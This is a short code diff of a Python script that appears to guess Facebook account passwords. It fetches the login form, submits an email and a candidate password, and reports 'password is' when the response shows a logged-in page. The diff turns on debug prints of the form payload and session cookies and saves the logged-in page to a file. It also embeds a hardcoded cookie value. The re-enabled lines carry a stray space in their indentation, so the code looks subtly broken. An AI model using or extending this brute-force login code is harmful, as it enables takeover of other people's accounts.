@@ -22,8 +22,8 @@ def create_form():
 	form=dict()
 	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 	data=requests.get(post_url,headers=headers)
-	# print('Form Creating : ',data.url)
-	# print('Return Status : ',data.status_code)
+	 print('Form Creating : ',data.url)
+	 print('Return Status : ',data.status_code)
 	for i in data.cookies:
 		cookie[i.name]=i.value
 	data=BeautifulSoup(data.text,'html.parser').form
@@ -37,14 +37,14 @@ def function(email,passw,i):
 		payload,cookie=create_form()
 		payload['email']=email
 	payload['pass']=passw
-	# print(payload)
-	# print(cookie)
-	# print('lsd : ',payload['lsd'])
-	# print(cookie)
+	 print(payload)
+	 print(cookie)
+	 print('lsd : ',payload['lsd'])
+	 print(cookie)
 	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
 	if 'Find Friends' in r.text:
 		print('password is ',passw)
-		#open('d.html','w').write(r.text)
+		open('d.html','w').write(r.text)
 		return True
 	return False
 
